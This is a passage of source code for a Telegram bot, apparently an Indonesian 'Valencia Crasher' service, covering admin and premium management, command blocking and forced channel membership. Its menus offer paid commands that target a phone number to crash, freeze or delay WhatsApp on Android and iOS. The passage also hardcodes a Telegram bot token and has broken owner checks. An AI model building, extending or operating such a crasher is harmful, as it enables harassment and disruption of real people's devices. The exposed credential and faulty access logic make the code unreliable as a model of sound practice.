      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("addadmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format: /addadmin (reply)\n/addadmin 123456");
    }

    targetId = String(targetId);

    addAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD ADMIN ERROR:", err);
    ctx.reply("❌ Error addadmin");
  }
});

bot.command("deladmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\n/deladmin (reply)\n/deladmin 123456");
    }

    targetId = String(targetId);

    delAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("DEL ADMIN ERROR:", err);
    ctx.reply("❌ Error deladmin");
  }
});

bot.command("addprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;
    let days;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
      days = parseInt(args[0]);
    }
    
    else {
      targetId = args[0];
      days = parseInt(args[1]);
    }

    if (!targetId || !days) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /addprem 30\n" +
        "ID: /addprem 123456789 30"
      );
    }

    const expired = Date.now() + days * 86400000;

    premiumDB[targetId] = expired;
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙈𝙖𝙨𝙖 𝘼𝙠𝙩𝙞𝙛 : ${days} 
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD PREMIUM ERROR:", err);
    ctx.reply("❌ Error addpremium");
  }
});

bot.command("delprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    }
    
    else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /delprem\n" +
        "ID: /delprem 123456789"
      );
    }

    if (!premiumDB[targetId]) {
      return ctx.reply("❌ User bukan premium");
    }

    delete premiumDB[targetId];
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("DEL PREMIUM ERROR:", err);
    ctx.reply("❌ Error delpremium");
  }
});

bot.command("checkprem", async (ctx) => {
  const target = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from
    : ctx.from;

  if (!isPremium(target.id)) {
    return ctx.reply("❌ User bukan premium");
  }

  const expired = getPremiumExpire(target.id);

  return ctx.reply( `\`\`\`JS
✘ 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙩𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 : ${formatDate(expired)}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
    { parse_mode: "HTML" }
  );
});

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

const FotoUtama = "https://d.top4top.io/p_38935vjyn1.jpg";

let groupOnly = false

bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  const isPrivate = ctx.chat.type === 'private'
  const cmd = text.split(' ')[0].replace('/', '').toLowerCase()

  if (groupOnly && isPrivate) {
    return ctx.reply('❌ Mode Group Only aktif\nGunakan command di group')
  }

  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (cmd === 'grouponly' && !isOwner) {
    return ctx.reply('❌ Hanya Owner yang bisa mengakses cmd')
  }

  return next()
})

let forceChannel = '@infomasialwaysZillxy'
let channelOn = true

const CHANNEL_BOT_TOKEN = "8760896059:AAEqGnFejYZB3_2YC3XaxOwLgdCxp_EaG6g"
const channelCheckerBot = new Telegraf(CHANNEL_BOT_TOKEN)

function isOwner(ctx) {
  return ID_TELEGRAM || isAdmin(userId);
}

bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()
  const text = ctx.message.text
  if (!text.startsWith('/')) return next()
  if (!channelOn || !forceChannel) return next()

  const userId = ctx.from.id
  const isOwnerOrAdm = String(userId) === String(ID_TELEGRAM) || isAdmin(String(userId))
  if (isOwnerOrAdm) return next()

  try {
    const member = await channelCheckerBot.telegram.getChatMember(forceChannel, userId)
    if (member.status === 'left' || member.status === 'kicked') {
      return ctx.reply(
        `❌ Kamu harus join channel dulu!\n\n👉 ${forceChannel}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "📢 Join Channel", url: `https://t.me/${forceChannel.replace('@','')}` }]]
          }
        }
      )
    }
  } catch (e) {
    return ctx.reply('⚠️ Bot checker tidak bisa cek channel (pastikan bot admin di channel)')
  }

  return next()
})

const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "ꜱᴇᴛᴛɪɴɢꜱ", callback_data: "/owner_menu", style },
            { text: "ᴛᴏᴏʟꜱ", callback_data: "/tools_menu", style },
            { text: "ʙᴜɢꜱ", callback_data: "/bug_menu", style }
        ],
        [
            { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/alwaysZillxy_menu", style },
            { text: "ʜᴀʀɢᴀ ꜱᴄʀɪᴘᴛ", callback_data: "/harga_menu", style },
            { text: "ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ", callback_data: "/info_menu", style },
       ],
       [
            { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "t.me/quenvalencia", style }
        ]
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

bot.start(async (ctx) => {
    const userId = ctx.from.id
    const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`
    const isGroup = ctx.chat.type === 'group' || ctx.chat.type === 'supergroup'

    // cek follow channel kalau channelOn aktif
    if (channelOn && forceChannel) {
        const isOwnerOrAdm = String(userId) === String(ID_TELEGRAM) || isAdmin(String(userId))

        if (!isOwnerOrAdm) {
            // loading cek dulu di chat user
            const loadingMsg = await ctx.reply(
                `⬡═―—―――――――――――――—═⬡\n🔍 Mengecek Status Channel...\n[░░░░░░░░░░] 0%\n⬡═―—―――――――――――――—═⬡`
            )

            await new Promise(r => setTimeout(r, 800))
            await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
                `⬡═―—―――――――――――――—═⬡\n🔍 Mengecek Status Channel...\n[▓▓▓░░░░░░░] 30%\n⬡═―—―――――――――――――—═⬡`
            )

            await new Promise(r => setTimeout(r, 800))
            await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
                `⬡═―—―――――――――――――—═⬡\n🔍 Mengecek Status Channel...\n[▓▓▓▓▓▓░░░░] 60%\n⬡═―—―――――――――――――—═⬡`
            )

            await new Promise(r => setTimeout(r, 800))

            let isMember = false
            try {
                const member = await channelCheckerBot.telegram.getChatMember(forceChannel, userId)
                isMember = !['left', 'kicked'].includes(member.status)
            } catch (e) {}

            if (!isMember) {
                await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
                    `⬡═―—―――――――――――――—═⬡\n❌ Akses Ditolak!\n[▓▓▓▓▓▓▓▓▓▓] 100%\n\nKamu belum follow channel kami.\nJoin dulu untuk bisa menggunakan bot.\n⬡═―—―――――――――――――—═⬡`,
                    {
                        reply_markup: {
                            inline_keyboard: [[{ text: "📢 Join Channel", url: `https://t.me/${forceChannel.replace('@', '')}` }]]
                        }
                    }
                )
                return
            }

            await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
                `⬡═―—―――――――――――――—═⬡\n✅ Channel Terdeteksi!\n[▓▓▓▓▓▓▓▓▓▓] 100%\n\nMemproses verifikasi...\n⬡═―—―――――――――――――—═⬡`
            )

            // kirim loading verifikasi ke channel
            try {
                const botInfo = await ctx.telegram.getMe()
                const botUsername = `@${botInfo.username}`

                const steps = [
                    `⬡═―—―――――――――――――—═⬡\n🔄 Memverifikasi User...\n[░░░░░░░░░░] 0%\n⬡═―—―――――――――――――—═⬡`,
                    `⬡═―—―――――――――――――—═⬡\n🔄 Memverifikasi User...\n[▓▓░░░░░░░░] 20%\n⬡═―—―――――――――――――—═⬡`,
                    `⬡═―—―――――――――――――—═⬡\n🔄 Memverifikasi User...\n[▓▓▓▓░░░░░░] 40%\n⬡═―—―――――――――――――—═⬡`,
                    `⬡═―—―――――――――――――—═⬡\n🔄 Memverifikasi User...\n[▓▓▓▓▓▓░░░░] 60%\n⬡═―—―――――――――――――—═⬡`,
                    `⬡═―—―――――――――――――—═⬡\n🔄 Memverifikasi User...\n[▓▓▓▓▓▓▓▓░░] 80%\n⬡═―—―――――――――――――—═⬡`,
                    `⬡═―—―――――――――――――—═⬡\n✅ Berhasil Terverifikasi!\n[▓▓▓▓▓▓▓▓▓▓] 100%\n\n🤖 Bot : ${botUsername}\n👤 User : ${username} | ${userId}\n\n✨ Berhasil Terverifikasi ✨\n⬡═―—―――――――――――――—═⬡`,
                ]

                const sent = await channelCheckerBot.telegram.sendMessage(forceChannel, steps[0])
                for (let i = 1; i < steps.length; i++) {
                    await new Promise(r => setTimeout(r, 800))
                    await channelCheckerBot.telegram.editMessageText(forceChannel, sent.message_id, undefined, steps[i])
                }
            } catch (e) {}

            // hapus pesan loading setelah verifikasi selesai
            try { await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id) } catch (e) {}
        }
    }

    // tampil menu normal (private & group)
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Belum Terhubung"
    const runTime = runtime(process.uptime())
    const menuMessage = `
<blockquote><tg-emoji emoji-id="5411466090662359206">🥀</tg-emoji> 〔 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 〕
𝚃𝚑𝚎 𝙰𝚗𝚐𝚎𝚕 𝚘𝚏 𝙳𝚎𝚊𝚝𝚑 — 𝒗𝒂𝒍𝒆𝒏𝒄𝒊𝒂 𝒄𝒓𝒂𝒔𝒉𝒆𝒓 — 𝚑𝚊𝚜 𝚊𝚛𝚛𝚒𝚟𝚎𝚍. 𝙺𝚗𝚎𝚎𝚕 𝚋𝚎𝚏𝚘𝚛𝚎 𝚑𝚒𝚖 𝚊𝚝 𝚘𝚗𝚌𝚎, 𝚜𝚌𝚞𝚖!.
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @quenvalencia 
<tg-emoji emoji-id="4956648660541637813">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
<tg-emoji emoji-id="5323811602061889129">🌑</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.0
<tg-emoji emoji-id="5326065523589416704">🔫</tg-emoji> sᴛᴀᴛᴜs : Premium Verified ✅</blockquote>
<blockquote>〔 Informasi Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}
<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runTime}
<tg-emoji emoji-id="4904848288345228262">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${isGroup ? username : `@${ctx.from.username || "Tidak Ada"}`}
<tg-emoji emoji-id="6206497372176913599">🔗</tg-emoji> ᴜsᴇʀ ɪᴅ : ${userId}</blockquote>
`
    try {
        stopMenuAnimation()
        const sentMsg = await ctx.replyWithPhoto(FotoUtama, {
            caption: menuMessage,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        })
        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                )
            } catch (e) {}
        }, 2500)
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error)
    }
})

bot.action("/start", async (ctx) => {
    const userId = ctx.from.id;
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Belum Terhubung";
    const runTime = runtime(process.uptime());
    const menuMessage = `
<blockquote><tg-emoji emoji-id="5411466090662359206">🥀</tg-emoji> 〔 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 〕
𝚃𝚑𝚎 𝙰𝚗𝚐𝚎𝚕 𝚘𝚏 𝙳𝚎𝚊𝚝𝚑 — 𝒗𝒂𝒍𝒆𝒏𝒄𝒊𝒂 𝒄𝒓𝒂𝒔𝒉𝒆𝒓 — 𝚑𝚊𝚜 𝚊𝚛𝚛𝚒𝚟𝚎𝚍. 𝙺𝚗𝚎𝚎𝚕 𝚋𝚎𝚏𝚘𝚛𝚎 𝚑𝚒𝚖 𝚊𝚝 𝚘𝚗𝚌𝚎, 𝚜𝚌𝚞𝚖!.
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @quenvalencia 
<tg-emoji emoji-id="4956648660541637813">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
<tg-emoji emoji-id="5323811602061889129">🌑</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.0
<tg-emoji emoji-id="5326065523589416704">🔫</tg-emoji> sᴛᴀᴛᴜs : Premium Verified ✅</blockquote>
<blockquote>〔 Information Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}
<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runTime}
<tg-emoji emoji-id="4904848288345228262">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "Tidak Ada"}
<tg-emoji emoji-id="6206497372176913599">🔗</tg-emoji> ᴜsᴇʀ ɪᴅ : ${userId}</blockquote>
`;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: FotoUtama,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `
<blockquote>╭╴⟬ <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> MURBUG • VVVIP ACCESS <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> <tg-emoji emoji-id="5474141032289441762">📱</tg-emoji> Android • Delay Invisible ✅ can spam
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /zxbugs      <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /zxkill      <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xyzyy     <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xsuper     <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
────────────────────────────
<tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> Tips:
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /command → menghidupkan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /command → mematikan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot →menambahkan sender
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi → menghapus sender 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd → menampilkan semua command 
╰────────────────────────────</blockquote>
`;

    const keyboard = [
        [
            { text: "ɴᴇxᴛ", callback_data: "/visible_bug" },
        ],
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/visible_bug', async (ctx) => {
    stopMenuAnimation(); 
    const visible_bugMenu = `
<blockquote>╭╴⟬ <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> zxbugs • VVVIP ACCESS <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji><tg-emoji emoji-id="5474141032289441762">📱</tg-emoji> Device • Bug Andro X Ios         not spam
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /VcXIoscrash     <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> forclose ios new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Blank      <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> VcXBlank andro new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /VcXDelay      <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> delay whatsapp new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /VcXcrash         <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> forclose andro new 
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Frezze     <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> frezze whatsapp new
────────────────────────────
<tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> Tips:
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /command → menghidupkan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /command → mematikan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot →menambahkan sender
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi → menghapus sender 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd → menampilkan semua command 
╰────────────────────────────</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(visible_bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di visible_bug:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/owner_menu', async (ctx) => {
    stopMenuAnimation(); 
    const owner_menuMenu = `
<blockquote>#- 𝘚 𝘌 𝘛 𝘛 𝘐 𝘕 𝘎  𝘖 𝘞 𝘕 𝘌 𝘙  -  𝘔 𝘌 𝘕 𝘜

"一緒 Setting Menu 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  ᯤ",
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /cmd - [MENGUNCI CMD BUGS]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /cmd/ - [MEMBUKA KUNCI CMD BUGS]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd - [LIST ALL CMD YANG DI KUNCI]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /grouponly on/off - [UNTUK MENJAGA AGAR TIDAK ADA YANG CHAT DI PRIVATE BOT]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot - [ADD SENDER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi - [HAPUS SENDER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /setchannel - [SET CHANNEL KALIAN COCOK BUAT PHUS CH]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /channel on/off - [MENGAKTIFKAN SET CHANNEL]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addadmin - [MENAMBAH ADMIN]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /deladmin - [MENGHAPUS ADMIN]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addprem - [MENAMBAHKAN PREMIUM USER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /delprem - [MENGHAPUS PREMIUM USER]</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
